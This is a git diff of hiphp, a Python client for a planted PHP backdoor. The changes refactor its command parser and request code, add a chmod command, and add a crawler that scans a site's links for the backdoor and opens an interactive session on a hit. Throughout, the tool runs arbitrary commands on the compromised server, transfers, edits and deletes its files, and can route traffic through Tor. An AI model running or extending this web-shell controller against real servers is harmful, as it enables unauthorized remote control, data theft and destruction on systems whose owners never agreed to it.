@@ -24,6 +24,7 @@ from hiphp.hiphpabout import about
 from hiphp.hiphplogo import *
 from hiphp.hiphpeditor import editor
 from hiphp.hiphplinkextractor import *
+from hiphp.hiphpfunc import *
 #from ashar import *
 from hexor import *
 #from asciitext import *
@@ -31,7 +32,7 @@ import requests
 import re
 import ast
 from os.path import exists
-from biglibrary import *
+#from biglibrary import *
 import base64
 
 #
@@ -53,7 +54,13 @@ class hiphp:
     def __init__(self,key,url,retu=False,proxies=""):
         #
         self.key=tomd5(str(key))# Encrypt the 'key' with 'md5'.
-        self.url=str(url)
+
+
+        if url.startswith("http://") or url.startswith("https://"):
+            self.url = str(url)
+        else:
+            self.url = "http://" + str(url)
+        #self.url=str(url)
         self.retu=retu
 
         #
@@ -84,6 +91,25 @@ class hiphp:
 
         self.proxies=proxies
 
+    def crawl(self,url):
+        links = get_all_website_links(url)
+    
+        for link in links:
+            hiphp.check_hiphp_in(self,link)
+
+    def check_hiphp_in(self,url):
+        pp11 = hiphp.do(self, self.key, url, self.headers, True, f"echo '{self.key}';")
+
+        if pp11 != self.key:
+            self.color2.c(errx + " " + url, self.c_red)
+        else:
+            self.color2.c(msgs + " " + url, self.c_green)
+            self.url = url
+            url_w=re.compile(r"https?://(www\.)?")
+            self.url_w=url_w.sub('',str(url)).strip().strip('/')
+            hiphp.cli(self)
+            exit()
+
     #cli:
     def cli(self):
         self.DS=hiphp.do(self,self.key,self.url,self.headers,True,DIRECTORY_SEPARATOR())
@@ -109,6 +135,10 @@ class hiphp:
             scanner=input(f"Scan '{self.url}' to find HIPHP_HOLE_CODE (Y/N):")
             
             if scanner.lower()=="y":
+                hiphp.crawl(self,self.url)
+                
+                exit()
+                """
                 def crawl(url):
                     #all_links=[]
                     #print(f"[*] Crawling: {url}")
@@ -136,6 +166,7 @@ class hiphp:
                         exit()
                 crawl(self.url)
                 exit()
+                """
                 """
                 import requests
                 from bs4 import BeautifulSoup
@@ -183,37 +214,50 @@ class hiphp:
         #    exit()
         if command and command!="":
             #help
-            if command[0:6].lower()=="--help" or command[0:4].lower()=="help":
-                help_c=command.split(" ")
+            if command.lower().startswith("--help") or command.lower().startswith("help"):
+            #if command[0:6].lower()=="--help" or command[0:4].lower()=="help":
                 try:
-                    help(__version__,help_c[1])
+                    help(__version__,command.split(" ")[1])
                 except:
                     print(help(__version__))
             #version
-            elif command[0:9].lower()=="--version" or command[0:7].lower()=="version":
+            elif command.lower().startswith("--version") or command.lower().startswith("version"):
+            #elif command[0:9].lower()=="--version" or command[0:7].lower()=="version":
                 print(__version__)
             #exit
-            elif command[0:6].lower()=="--exit" or command[0:4].lower()=="exit":
+            elif command.lower().startswith("--exit") or command.lower().startswith("exit"):
+            #elif command[0:6].lower()=="--exit" or command[0:4].lower()=="exit":
                 exit()
             #license
-            elif command[0:9].lower()=="--license" or command[0:7].lower()=="license":
+            elif command.lower().startswith("--license") or command.lower().startswith("license"):
+            #elif command[0:9].lower()=="--license" or command[0:7].lower()=="license":
                 print(license())
             #about
-            elif command[0:7].lower()=="--about" or command[0:5].lower()=="about":
+            elif command.lower().startswith("--about") or command.lower().startswith("about"):
+            #elif command[0:7].lower()=="--about" or command[0:5].lower()=="about":
                 print(about())
+            #chmod
+            elif command.lower().startswith("--chmod") or command.lower().startswith("chmod"):
+            #elif command[0:7].lower()=="--about" or command[0:5].lower()=="about":
+                ppth=command.split(" ")[1:]
+                code=chmod(ppth[0],ppth[1])
+                #print(code)
+                print(hiphp.do(self,self.key,self.url,self.headers,True,code))
+                #print(ppth)
             #cp
-            elif command[0:4].lower()=="--mv" or command[0:2].lower()=="mv":
-                ppth=command.split(" ")
+            elif command.lower().startswith("--mv") or command.lower().startswith("mv"):
+            #elif command[0:4].lower()=="--mv" or command[0:2].lower()=="mv":
+                ppth=command.split(" ")[1:]
                 try:
-                    command=simulate_mv(ppth[1],ppth[2])
+                    command=simulate_mv(ppth[0],ppth[1])
                     print(hiphp.do(self,self.key,self.url,self.headers,True,command))
                 except:
                     help(__version__,"--mv")
             #download
-            elif command[0:6].lower()=="--down" or command[0:4].lower()=="down" or command[0:8].lower()=="download":
-                down=command.split(" ")
+            elif command.lower().startswith("--down") or command.lower().startswith("down") or command.lower().startswith("download"):
+                down=command.split(" ")[1:]
                 try:
-                    if down[1].lower()=="-f":
+                    if down[0].lower()=="-f":
                         """command=file_get_contents(down[2])
                         content=hiphp.do(self,self.key,self.url,self.headers,True,command)
                         try:
@@ -225,34 +269,36 @@ class hiphp:
                             f.write(content)
                             f.close()"""
                         try:
-                            out_path=down[3]
+                            out_path=down[2]
                         except:
                             out_path=""
-                        print(smsg_1+hiphp.download(self,down[2],out_path))
-                    elif down[1].lower()=="-d":
+                        print(smsg_1+hiphp.download(self,down[1],out_path))
+                    elif down[0].lower()=="-d":
                         try:
-                            zip_file_name=hiphp.compress(self,down[2])
+                            zip_file_name=hiphp.compress(self,down[1])
                         except:
                             zip_file_name=hiphp.compress(self)
                         #zip_file_name=hiphp.do(self,self.key,self.url,self.headers,True,command)
 
                         try:
-                            out_path=down[3]
+                            out_path=down[2]
                         except:
                             out_path=""
                         print(smsg_1+hiphp.download(self,zip_file_name,out_path))
-                    elif down[1].lower()=="-all":
+                    elif down[0].lower()=="-all":
                         try:
-                            out_path=down[2]
+                            out_path=down[1]
                         except:
                             out_path=""
                         zip_file_name=hiphp.compress(self)
                         print(smsg_1+hiphp.download(self,zip_file_name,out_path))
+                    else:
+                        help(__version__,"--down")
 
                 except:
                     help(__version__,"--down")
             #zip
-            elif command[0:5].lower()=="--zip" or command[0:3].lower()=="zip":
+            elif command.lower().startswith("--zip") or command.lower().startswith("zip"):
                 
                 try:
                     ziping=command.split(" ")[1]
@@ -264,7 +310,7 @@ class hiphp:
                 except:
                     help(__version__,"--zip")
             #update
-            elif command[0:8].lower()=="--update" or command[0:6].lower()=="update":
+            elif command.lower().startswith("--update") or command.lower().startswith("update"):
                 r="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/version.txt"
                 version = requests.get(r).text
                 version=version.replace('\n', ' ').replace('\r', '').replace(' ', '')
@@ -285,7 +331,33 @@ class hiphp:
                 else:
                     print(msg_4)
             #ls
-            elif command[0:4].lower()=="--ls" or command[0:2].lower()=="ls":
+            elif command.lower().startswith("--ls") or command.lower().startswith("ls"):
+                if len(command) == 4 or len(command) == 2:
+                    command = scandir()
+                elif command.lower().startswith("--ls -all"):
+                    dirx = command[10:] if len(command) > 10 else "." + self.DS
+                    command = scandir_all(dirx)
+                elif command.lower().startswith("ls -all"):
+                    dirx = command[8:] if len(command) > 8 else "." + self.DS
+                    command = scandir_all(dirx)
+                else:
+                    dirx = command[5:] if len(command) == 4 else command[3:]
+                    if dirx[-1] != self.DS:
+                        dirx += self.DS
+                    command = scandir(dirx)
+
+                sd = hiphp.do(self, self.key, self.url, self.headers, True, command)
+                x = ast.literal_eval(sd)
+
+                for i in range(len(x)):
+                    if x[i] not in (".", ".."):
+                        x[i] = x[i].replace("\/", "/")
+
+                separators = " | " if len(x) > 1 else ""
+                if len(x) > 0:
+                    print(lslist(x, separator=separators))
+                #print(lslist(x, separator=separators))
+                """elif command[0:4].lower()=="--ls" or command[0:2].lower()=="ls":
                 if len(command)==4 or len(command)==2:
                     command=scandir()
                 elif command[0:4].lower()=="--ls" and command[5:9].lower()=="-all":
@@ -317,99 +389,112 @@ class hiphp:
                     separators=" | "
                 else:
                     separators=""
-                biglibrary().lslist(x,separator=separators)
+                print(lslist(x,separator=separators))"""
             #set
-            elif command[0:4].lower()=="--cd" or command[0:2].lower()=="cd":
-                self.cd=""
-                if command[0:4].lower()=="--cd":
-                    self.cd=f"chdir('{reee}{self.DS}{command[5:]}');"
+            elif command.lower().startswith("--cd") or command.lower().startswith("cd"):
+                self.cd = ""
+                if command.lower().startswith("--cd"):
+                    self.cd = f"chdir('{reee}{self.DS}{command[5:]}');"
                 else:
-                    self.cd=f"chdir('{reee}{self.DS}{command[3:]}');"
+                    self.cd = f"chdir('{reee}{self.DS}{command[3:]}');"
             #set
-            elif command[0:5].lower()=="--set" or command[0:3].lower()=="set":
-                if command[0:5].lower()=="--set":
-                    self.set+=command[6:]
+            elif command.lower().startswith("--set") or command.lower().startswith("set"):
+                if command.lower().startswith("--set"):
+                    self.set += command[6:]
                 else:
-                    self.set+=command[4:]
+                    self.set += command[4:]
             #delete set
-            elif command[0:6].lower()=="--dset" or command[0:4].lower()=="dset":
+            elif command.lower().startswith("--dset") or command.lower().startswith("dset"):
+            #elif command[0:6].lower()=="--dset" or command[0:4].lower()=="dset":
                 self.set=""
             #clear
-            elif command[0:5].lower()=="--cls" or command[0:3].lower()=="cls":
+            elif command.lower().startswith("--cls") or command.lower().startswith("cls"):
+            #elif command[0:5].lower()=="--cls" or command[0:3].lower()=="cls":
                 os.system('cls' if os.name == 'nt' else 'clear')
             #Get the hole Code
-            elif command[0:6].lower()=="--geth" or command[0:15].upper()=="HIPHP_HOLE_CODE" or command[0:4].lower()=="geth":
+            elif command.lower().startswith("--geth") or command.lower().startswith("geth") or command.lower().startswith("HIPHP_HOLE_CODE"):
+            #elif command[0:6].lower()=="--geth" or command[0:15].upper()=="HIPHP_HOLE_CODE" or command[0:4].lower()=="geth":
                 hiphp.get_hole(self,get=True)
             #cat
-            elif command[0:5].lower()=="--cat" or command[0:3].lower()=="cat":
-                if command[0:5].lower()=="--cat":
-                    dirx=command[6:]
+            elif command.lower().startswith("--cat") or command.lower().startswith("cat"):
+                if command.lower().startswith("--cat"):
+                    dirx = command[6:]
                 else:
-                    dirx=command[4:]
-                command=file_get_contents(dirx)
-                hiphp.do(self,self.key,self.url,self.headers,False,command)
-            #cat
-            elif command[0:5].lower()=="--edt" or command[0:3].lower()=="edt" or command[0:4].lower()=="edit":
-                dirx=command.split(" ")[1]
-                #if command[0:5].lower()=="--edt":
-                #    dirx=command[6:]
-                #else:
-                #    dirx=command[4:]
-                
+                    dirx = command[4:]
+    
+                command = file_get_contents(dirx)
+                hiphp.do(self, self.key, self.url, self.headers, False, command)
+
+            #edt
+            elif command.lower().startswith("--edt") or command.lower().startswith("edt") or command.lower().startswith("edit"):
+                dirx = command.split(" ")[1]
+    
                 try:
-                    from_path=os.path.dirname(dirx)
+                    from_path = os.path.dirname(dirx)
                 except:
-                    from_path="."
-                #print(from_path)
-                out_path=hiphp.download(self,dirx,"")
+                    from_path = "."
+    
+                out_path = hiphp.download(self, dirx, "")
                 editor(out_path)
-                hiphp.run(self,f"unlink('{dirx}');")
-                if from_path=="":
-                    hiphp.upload(self,out_path)
+    
+                hiphp.run(self, f"unlink('{dirx}');")
+    
+                if from_path == "":
+                    hiphp.upload(self, out_path)
                 else:
-                    hiphp.upload(self,out_path,from_path+self.DS)
+                    hiphp.upload(self, out_path, from_path + self.DS)
+    
                 os.remove(out_path)
+
                 #os.system('cls' if os.name == 'nt' else 'clear')
                 #print(out_path)
 
             #remove:
-            elif command[0:4].lower()=="--rm" or command[0:2].lower()=="rm" or command[0:6].lower()=="delete":
-                dirx=command.split(" ")
-                try:
-                    command=rm(dirx[1],dirx[2])
-                    hiphp.do(self,self.key,self.url,self.headers,False,command)
-                except:
-                    help(__version__,"--rm")
-            #php_info:
-            elif command[0:9].lower()=="--phpinfo" or command[0:7].lower()=="phpinfo":
-                command=php_info()
-                hiphp.do(self,self.key,self.url,self.headers,False,command)
-            #rf
-            elif command[0:4].lower()=="--rf" or command[0:2].lower()=="rf" or command[0:3].lower()=="run":
-                varss=command.split(" ")
-                if varss[len(varss)-1]=="":
-                    del varss[len(varss)-1]
-                print(hiphp.run_file(self,varss[1],varss[2:]))
-            #up
-            elif command[0:4].lower()=="--up" or command[0:2].lower()=="up" or command[0:6].lower()=="upload":
-                v=command.split(" ")
-                #print(v)
-                if len(v)>2:
-                #try:
-                    file_path=v[1]
-                    to=v[2]
-                    if to[len(to)-1:len(to)]!=self.DS:
-                        to=to+self.DS
-                    hiphp.upload(self,file_path,to)                    
-                #except:
+            elif command.lower().startswith("--rm") or command.lower().startswith("rm") or command.lower().startswith("delete"):
+                dirx = command.split(" ")
+
+                if len(dirx) < 3:
+                    help(__version__, "--rm")
                 else:
-                    hiphp.upload(self,command.split(" ")[1])
+                    try:
+                        command = rm(dirx[1], dirx[2])
+                        hiphp.do(self, self.key, self.url, self.headers, False, command)
+                    except:
+                        help(__version__, "--rm")
+
+            # php_info
+            elif command.lower().startswith("--phpinfo") or command.lower().startswith("phpinfo"):
+                command = php_info()
+                hiphp.do(self, self.key, self.url, self.headers, False, command)
+
+            # rf
+            elif command.lower().startswith("--rf") or command.lower().startswith("rf") or command.lower().startswith("run"):
+                varss = command.split(" ")
+                if varss[-1] == "":
+                    del varss[-1]
+                print(hiphp.run_file(self, varss[1], varss[2:]))
+
+            # up
+            elif command.lower().startswith("--up") or command.lower().startswith("up") or command.lower().startswith("upload"):
+                v = command.split(" ")
+                if len(v) > 2:
+                    file_path = v[1]
+                    to = v[2]
+                    if to[-1:] != self.DS:
+                        to += self.DS
+                    hiphp.upload(self, file_path, to)
+                else:
+                    hiphp.upload(self, v[1])
             else:
-                comand_return=hiphp.do(self,self.key,self.url,self.headers,True,command)
-                if comand_return!="":
-                    print(comand_return)
+                comand_return = hiphp.do(self, self.key, self.url, self.headers, True, command)
+                if comand_return != "":
+                    if re.search(re.escape(emsg_3), comand_return):
+                        self.color2.c(emsg_2,self.c_red)
+                    else:
+                        print(comand_return)
                 else:
-                    self.color2.c(errx+" "+command+emsg_6,self.c_red)
+                    self.color2.c(errx + " " + command + emsg_6, self.c_red)
+
         else:
             self.color2.c(emsg_2,self.c_red)
         
@@ -419,51 +504,47 @@ class hiphp:
             #exit()
 
     #do:
-    def do(self,key,url,header,retu,command):
+    def do(self, key, url, header, retu, command):
         regex = re.compile(r"^https?\:\/\/[\w\-\.]+\.onion")
-        proxies_onion = {'http': 'socks5h://127.0.0.1:9150','https': 'socks5h://127.0.0.1:9150'}
+        proxies_onion = {'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
+        
         try:
             if regex.match(url):
-                #.onion
-                response=requests.post(url,headers=header,proxies=proxies_onion)
+                # .onion
+                proxies = proxies_onion
             else:
-                if self.proxies!="":
-                    response=requests.post(url,headers=header,proxies=self.proxies)
-                else:
-                    response=requests.post(url,headers=header)
-            #response=requests.post(url,headers=header)
-            #
-            if response.status_code==200:
-                key_len=len(key)+1
-                # if the key are true:
-                if response.text[0:key_len]=="#"+key:
-                    ploads={'command':self.cd+self.set+command}
-                    if ".onion" in url:
-                        response=requests.post(url,headers=header,data=ploads,proxies=proxies_onion)
-                    else:
-                        if self.proxies!="":
-                            response=requests.post(url,headers=header,data=ploads,proxies=self.proxies)
-                        else:
-                            response=requests.post(url,headers=header,data=ploads)
-                    response_text=response.text[key_len:]
-                    if retu==True:
+                proxies = self.proxies if self.proxies != "" else None
+                
+            response = requests.post(url, headers=header, proxies=proxies, data=self._build_payload(command))
+            
+            if response.status_code == 200:
+                response_text = response.text
+                if response_text.startswith("#" + key):
+                    response_text = response_text[len(key) + 1:]
+                    if retu:
                         return response_text
                     else:
-                        if len(response_text)!=0:
+                        if response_text:
                             print(response_text)
                 else:
-                    if retu==True:
+                    if retu:
                         return emsg_1
                     else:
-                        hexor().c(emsg_1,self.c_red)
+                        hexor().c(emsg_1, self.c_red)
                         exit()
-        except:
-            emsg=emsg_3+" '"+url+"'."
-            if retu==True:
+            else:
+                raise Exception("Request failed with status code: " + str(response.status_code))
+        except Exception as e:
+            emsg = emsg_3 + " '" + url + "'."
+            if retu:
                 return emsg
             else:
-                hexor().c(emsg,self.c_red)
+                hexor().c(emsg, self.c_red)
                 exit()
+
+    def _build_payload(self, command):
+        ploads = {'command': self.cd + self.set + command}
+        return ploads
 
     #run_file:
     def run_file(self,file_path,*opts):        
@@ -540,7 +621,6 @@ class hiphp:
             outpath=download_folder
         else:
             outpath=os.path.abspath(os.getcwd())
-
 
         new_command=file_to_b64(path_x)
         path_x=os.path.basename(path_x)
